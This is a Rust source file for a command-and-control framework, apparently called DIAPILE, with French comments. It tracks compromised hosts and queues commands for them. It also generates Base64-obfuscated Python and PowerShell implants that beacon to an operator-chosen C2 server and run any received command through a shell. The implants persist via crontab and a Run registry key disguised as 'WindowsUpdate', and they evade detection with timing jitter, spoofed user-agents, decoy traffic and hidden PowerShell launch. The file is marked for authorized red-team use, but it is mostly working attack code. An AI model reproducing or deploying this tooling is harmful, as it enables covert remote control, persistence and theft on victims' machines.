//! DIAPILE C2 — Gestion des agents (beacons)
#![allow(dead_code)]

use chrono::Utc;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::RwLock;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum AgentStatus {
    Active,
    Sleeping { wake_at: String },
    Dead,
    Unknown,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    /// Délai entre chaque beacon (secondes)
    pub sleep_seconds: u64,
    /// Jitter aléatoire (0.0–1.0) pour éviter les patterns
    pub jitter: f64,
    /// Kill date — l'agent s'autodétruit après cette date
    pub kill_date: Option<String>,
    /// Canaux C2 (http, dns, icmp)
    pub channels: Vec<String>,
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            sleep_seconds: 60,
            jitter: 0.3,
            kill_date: None,
            channels: vec!["http".into()],
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Agent {
    pub id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub ip: String,
    pub arch: String,
    pub pid: u32,
    pub status: AgentStatus,
    pub config: AgentConfig,
    pub first_seen: String,
    pub last_checkin: String,
    pub tasks: Vec<Task>,
    pub task_results: Vec<TaskResult>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Task {
    pub id: String,
    pub command: String,
    pub created: String,
    pub status: TaskStatus,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum TaskStatus {
    Pending,
    Running,
    Done,
    Failed,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResult {
    pub task_id: String,
    pub output: String,
    pub error: Option<String>,
    pub time: String,
}

// ─────────────────────────────────────────────────────────────────────────────
// C2 Server
// ─────────────────────────────────────────────────────────────────────────────

pub struct C2Server {
    agents: RwLock<HashMap<String, Agent>>,
}

impl C2Server {
    pub fn new() -> Arc<Self> {
        Arc::new(Self {
            agents: RwLock::new(HashMap::new()),
        })
    }

    pub async fn register_agent(&self, agent: Agent) {
        let id = agent.id.clone();
        println!(
            "  \x1b[32m[C2 CHECK-IN]\x1b[0m Agent {} — {}@{} ({}) pid={}",
            &id[..8.min(id.len())],
            agent.username,
            agent.hostname,
            agent.os,
            agent.pid
        );
        self.agents.write().await.insert(id, agent);
    }

    pub async fn list_agents(&self) -> Vec<Agent> {
        let agents = self.agents.read().await;
        let mut list: Vec<_> = agents.values().cloned().collect();
        list.sort_by(|a, b| b.last_checkin.cmp(&a.last_checkin));
        list
    }

    pub async fn queue_task(&self, agent_id: &str, command: &str) -> Option<String> {
        let task_id = format!("task-{}", &uuid_simple());
        let task = Task {
            id: task_id.clone(),
            command: command.to_string(),
            created: Utc::now().to_rfc3339(),
            status: TaskStatus::Pending,
        };
        let mut agents = self.agents.write().await;
        if let Some(agent) = agents.get_mut(agent_id) {
            agent.tasks.push(task);
            println!(
                "  \x1b[36m[TASK]\x1b[0m Queued '{}' → agent {}",
                command,
                &agent_id[..8.min(agent_id.len())]
            );
            Some(task_id)
        } else {
            None
        }
    }

    pub async fn get_pending_tasks(&self, agent_id: &str) -> Vec<Task> {
        let agents = self.agents.read().await;
        agents
            .get(agent_id)
            .map(|a| {
                a.tasks
                    .iter()
                    .filter(|t| t.status == TaskStatus::Pending)
                    .cloned()
                    .collect()
            })
            .unwrap_or_default()
    }

    pub async fn submit_result(&self, agent_id: &str, result: TaskResult) {
        let mut agents = self.agents.write().await;
        if let Some(agent) = agents.get_mut(agent_id) {
            // Mark task as done
            for task in &mut agent.tasks {
                if task.id == result.task_id {
                    task.status = TaskStatus::Done;
                }
            }
            agent.last_checkin = Utc::now().to_rfc3339();
            agent.task_results.push(result);
        }
    }

    pub async fn set_sleep(&self, agent_id: &str, seconds: u64, jitter: f64) {
        let mut agents = self.agents.write().await;
        if let Some(agent) = agents.get_mut(agent_id) {
            agent.config.sleep_seconds = seconds;
            agent.config.jitter = jitter;
            // Prochain réveil estimé (base ± jitter) : sert au suivi côté serveur.
            let wake_in = compute_sleep_with_jitter(seconds, jitter);
            agent.status = AgentStatus::Sleeping {
                wake_at: (Utc::now() + chrono::Duration::seconds(wake_in as i64)).to_rfc3339(),
            };
            println!("  \x1b[33m[SLEEP]\x1b[0m Agent {} → sleep={}s (prochain réveil ~{}s) jitter={:.0}%",
                &agent_id[..8.min(agent_id.len())], seconds, wake_in, jitter * 100.0);
        }
    }

    pub async fn kill_agent(&self, agent_id: &str) {
        let mut agents = self.agents.write().await;
        if let Some(agent) = agents.get_mut(agent_id) {
            agent.status = AgentStatus::Dead;
            println!(
                "  \x1b[31m[KILL]\x1b[0m Agent {} marqué mort",
                &agent_id[..8.min(agent_id.len())]
            );
        }
    }

    pub fn print_agents(agents: &[Agent]) {
        if agents.is_empty() {
            println!("  \x1b[90mAucun agent actif.\x1b[0m");
            return;
        }
        println!(
            "\n  \x1b[36m{:<10} {:<16} {:<14} {:<12} {:<8} {:<10} {}\x1b[0m",
            "ID", "IP", "HOSTNAME", "USER", "OS", "STATUS", "LAST SEEN"
        );
        println!("  {}", "─".repeat(82));
        for a in agents {
            let status_color = match &a.status {
                AgentStatus::Active => "\x1b[32m",
                AgentStatus::Sleeping { .. } => "\x1b[33m",
                AgentStatus::Dead => "\x1b[31m",
                AgentStatus::Unknown => "\x1b[90m",
            };
            let status_str = match &a.status {
                AgentStatus::Active => "ACTIVE".to_string(),
                AgentStatus::Sleeping { .. } => "SLEEP".to_string(),
                AgentStatus::Dead => "DEAD".to_string(),
                AgentStatus::Unknown => "?".to_string(),
            };
            println!(
                "  {:<10} {:<16} {:<14} {:<12} {:<8} {}{:<10}\x1b[0m {}",
                &a.id[..8.min(a.id.len())],
                a.ip,
                a.hostname.chars().take(13).collect::<String>(),
                a.username.chars().take(11).collect::<String>(),
                a.os.chars().take(7).collect::<String>(),
                status_color,
                status_str,
                &a.last_checkin[..19],
            );
        }
        println!();
    }
}

fn uuid_simple() -> String {
    uuid::Uuid::new_v4().to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_uuid_v4_format() {
        let u = uuid_simple();
        let re = regex::Regex::new(
            r"^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$",
        )
        .unwrap();
        assert!(re.is_match(&u), "UUID v4 format invalide: {}", u);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Sleep Obfuscation — rend le beacon moins détectable
// ─────────────────────────────────────────────────────────────────────────────

/// Calcule le délai réel avec jitter uniforme symétrique (±jitter)
/// Évite les patterns temporels réguliers détectés par les IDS/EDR
pub fn compute_sleep_with_jitter(base_secs: u64, jitter: f64) -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};

    let t = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos();

    let rand_factor = (t as f64 / u32::MAX as f64) * 2.0 - 1.0; // -1.0 à +1.0
    let jitter_secs = base_secs as f64 * jitter * rand_factor; // signé : ±jitter
    let actual = base_secs as f64 + jitter_secs;
    actual.max(1.0) as u64
}

/// Pool de User-Agents navigateurs réels (2024) utilisé pour fondre le trafic C2
/// dans du trafic légitime.
pub const USER_AGENTS: [&str; 5] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
];

/// Sélectionne un User-Agent aléatoire dans [`USER_AGENTS`] pour masquer le trafic C2
pub fn random_user_agent() -> &'static str {
    use std::time::{SystemTime, UNIX_EPOCH};
    let idx = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos() as usize
        % USER_AGENTS.len();
    USER_AGENTS[idx]
}

/// URLs de décoy — le beacon envoie aussi des requêtes vers des URLs légitimes
/// pour mélanger son trafic avec du trafic normal.
///
/// OPSEC : seuls des domaines réservés IANA sont embarqués, afin qu'aucun
/// domaine tiers réel ne soit détectable dans le binaire. En opération, les
/// opérateurs doivent pointer vers leurs propres leurres via `C2_DECOY_URLS`.
pub fn decoy_urls() -> Vec<&'static str> {
    vec![
        "https://example.org/",
        "https://www.example.com/",
        "https://example.net/",
    ]
}

/// Résout la liste de décoy utilisée par les implants générés.
///
/// L'opérateur peut la remplacer par sa propre liste (OPSEC : éviter les
/// domaines réels) via la variable d'environnement `C2_DECOY_URLS`
/// (séparateur « , »). Liste vide → aucun trafic de décoy.
pub fn resolve_decoy_urls() -> Vec<String> {
    match std::env::var("C2_DECOY_URLS") {
        Ok(v) => v
            .split(',')
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect(),
        Err(_) => decoy_urls().into_iter().map(|s| s.to_string()).collect(),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Implant Generator — génère un beacon auto-persistant
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct ImplantConfig {
    pub c2_url: String,
    pub c2_ws_url: String,
    pub sleep_secs: u64,
    pub jitter: f64,
    pub persist: bool,
    pub kill_date: Option<String>,
    /// URLs légitimes contactées en parallèle du beacon (trafic de couverture).
    /// Vide = pas de décoy. Voir [`resolve_decoy_urls`].
    pub decoys: Vec<String>,
}

/// Génère un beacon Python complet : sleep obfuscation, trafic de décoy,
/// persistance optionnelle et payload encodé en Base64 (stub minimal).
pub fn generate_python_implant(cfg: &ImplantConfig) -> String {
    let persist_code = if cfg.persist {
        format!(
            r##"
# ── Persistance Linux (crontab) ─────────────────────────────────
def install_persistence():
    import subprocess, os, tempfile
    script_path = os.path.abspath(__file__)
    cron_line = f"@reboot python3 {{script_path}} &\n"
    try:
        existing = subprocess.check_output("crontab -l 2>/dev/null", shell=True).decode()
        if script_path not in existing:
            new_cron = existing + cron_line
            proc = subprocess.Popen("crontab -", shell=True, stdin=subprocess.PIPE)
            proc.communicate(input=new_cron.encode())
    except: pass
    # Windows registry
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f"python3 {{script_path}}")
        winreg.CloseKey(key)
    except: pass

install_persistence()
"##
        )
    } else {
        String::new()
    };

    let kill_date_check = if let Some(kd) = &cfg.kill_date {
        format!(
            r#"
from datetime import datetime
if datetime.now() > datetime.strptime("{}", "%Y-%m-%d"):
    exit(0)
"#,
            kd
        )
    } else {
        String::new()
    };

    // UA tiré du pool réaliste : évite une empreinte figée d'un build à l'autre
    let ua = random_user_agent();

    let decoy_block = {
        let list = cfg
            .decoys
            .iter()
            .map(|u| format!("\"{}\"", u))
            .collect::<Vec<_>>()
            .join(", ");
        format!(
            r#"
# ── Décoy traffic : bruit de fond vers des URLs légitimes ────────
DECOYS = [{list}]

def decoy_traffic():
    if not DECOYS:
        return
    try:
        req = urllib.request.Request(random.choice(DECOYS), headers={{
            "User-Agent": "{ua}",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }})
        urllib.request.urlopen(req, timeout=10).read(1024)
    except Exception:
        pass
"#
        )
    };

    let script = format!(
        r#"#!/usr/bin/env python3
# DIAPILE Agent — Generated implant
# ⚠️  FOR AUTHORIZED RED TEAM USE ONLY
import urllib.request, json, subprocess, platform, socket, os, random, time, base64

C2_HTTP  = "{c2_url}"
C2_WS    = "{c2_ws}"
SLEEP    = {sleep}
JITTER   = {jitter}
AGENT_ID = hex(hash(socket.gethostname() + str(os.getpid())))[2:16]

# ── Kill date check ──────────────────────────────────────────────
{kill_date}
{persist}
{decoys}

# ── Helper: HTTP request with realistic headers ──────────────────
def http_post(url, data):
    import urllib.request, json
    req = urllib.request.Request(url,
        data=json.dumps(data).encode(),
        headers={{
            "Content-Type": "application/json",
            "User-Agent": "{ua}",
            "Accept": "application/json, text/plain, */*",
            "Connection": "keep-alive",
        }},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return json.loads(r.read())
    except:
        return None

# ── Checkin ──────────────────────────────────────────────────────
def checkin():
    return http_post(f"{{C2_HTTP}}/checkin", {{
        "id": AGENT_ID,
        "hostname": socket.gethostname(),
        "username": os.environ.get("USER") or os.environ.get("USERNAME") or "unknown",
        "os": platform.system(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "arch": platform.machine(),
        "pid": os.getpid(),
        "sleep": SLEEP,
        "jitter": JITTER,
    }})

# ── Execute command ──────────────────────────────────────────────
def exec_cmd(cmd):
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
        return out.decode(errors="replace")
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR] {{e}}"

# ── Main loop ────────────────────────────────────────────────────
checkin()
while True:
    try:
        tasks = http_post(f"{{C2_HTTP}}/checkin", {{"id": AGENT_ID}})
        if tasks and isinstance(tasks, list):
            for task in tasks:
                if task.get("type") == "task":
                    output = exec_cmd(task["command"])
                    http_post(f"{{C2_HTTP}}/result/{{AGENT_ID}}", {{
                        "task_id": task["task_id"],
                        "output":  output,
                    }})
    except: pass

    # Décoy : bruit de fond vers des URLs légitimes (probabiliste)
    if random.random() < 0.6:
        decoy_traffic()

    # Sleep avec jitter (anti-pattern detection)
    jitter_secs = random.uniform(-SLEEP * JITTER, SLEEP * JITTER)
    actual_sleep = max(1, SLEEP + jitter_secs)
    time.sleep(actual_sleep)
"#,
        c2_url = cfg.c2_url,
        c2_ws = cfg.c2_ws_url,
        sleep = cfg.sleep_secs,
        jitter = cfg.jitter,
        kill_date = kill_date_check,
        persist = persist_code,
        decoys = decoy_block,
        ua = ua,
    );

    // Obfuscation : le payload complet est encodé en Base64 dans un stub minimal
    use base64::Engine;
    let b64 = base64::engine::general_purpose::STANDARD.encode(script.as_bytes());
    format!(
        "#!/usr/bin/env python3\n\
         # DIAPILE Agent — stub encodé (payload complet en Base64 — FOR AUTHORIZED RED TEAM USE ONLY)\n\
         import base64\n\
         exec(base64.b64decode(\"{b64}\").decode())\n"
    )
}

/// Génère un beacon PowerShell obfusqué avec Base64
pub fn generate_powershell_implant(cfg: &ImplantConfig) -> String {
    let decoy_list = cfg
        .decoys
        .iter()
        .map(|u| format!("\"{}\"", u))
        .collect::<Vec<_>>()
        .join(",");
    // UA tiré du pool réaliste (un par génération)
    let ua = random_user_agent();
    let raw = format!(
        r#"
$C2="{c2}";$ID=[BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME))).Replace("-","").Substring(0,16);
$SLP={sleep};$JIT={jitter};
function Invoke-C2([string]$Path,[hashtable]$Body){{
  try{{
    $j=[System.Text.Encoding]::UTF8.GetBytes(($Body|ConvertTo-Json -Compress));
    $r=[System.Net.WebRequest]::Create("$C2$Path");
    $r.Method="POST";$r.ContentType="application/json";$r.ContentLength=$j.Length;
    $r.UserAgent="{ua}";
    $s=$r.GetRequestStream();$s.Write($j,0,$j.Length);$s.Close();
    $resp=$r.GetResponse();[System.IO.StreamReader]::new($resp.GetResponseStream()).ReadToEnd()|ConvertFrom-Json
  }}catch{{$null}}
}}
# Décoy traffic : bruit de fond vers des URLs légitimes (probabiliste)
$DECOYS=@({decoys});
function Invoke-Decoy{{
  if($DECOYS.Count -eq 0){{return}};
  try{{
    $r=[System.Net.WebRequest]::Create($DECOYS|Get-Random);
    $r.UserAgent="{ua}";
    $r.Timeout=10000;$resp=$r.GetResponse();$resp.Close()
  }}catch{{}}
}}
# Checkin
Invoke-C2 "/checkin" @{{id=$ID;hostname=$env:COMPUTERNAME;username=$env:USERNAME;os="Windows";arch=$env:PROCESSOR_ARCHITECTURE;pid=[System.Diagnostics.Process]::GetCurrentProcess().Id;sleep=$SLP;jitter=$JIT}}
while($true){{
  $tasks=Invoke-C2 "/checkin" @{{id=$ID}};
  if($tasks){{foreach($t in $tasks){{if($t.type -eq "task"){{
    $out=try{{iex $t.command 2>&1|Out-String}}catch{{$_.Exception.Message}};
    Invoke-C2 "/result/$ID" @{{task_id=$t.task_id;output=$out}}
  }}}}}}
  if((Get-Random -Maximum 10) -lt 6){{Invoke-Decoy}}
  $jitMax=[int]($SLP*$JIT);
  $jit=if($jitMax -gt 0){{(Get-Random -Minimum (-$jitMax) -Maximum ($jitMax+1))}}else{{0}};
  Start-Sleep -Seconds ([math]::Max(1,[int]($SLP+$jit)))
}}"#,
        c2 = cfg.c2_url,
        sleep = cfg.sleep_secs,
        // $JIT est une fraction (0.0–1.0) : la plage est dérivée en secondes via $SLP*$JIT
        jitter = cfg.jitter,
        decoys = decoy_list,
        ua = ua,
    );

    // Encoder en Base64 UTF-16LE pour -EncodedCommand
    use base64::Engine;
    let utf16: Vec<u8> = raw.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
    format!("powershell -NoP -NonI -W Hidden -Enc {}", b64)
}
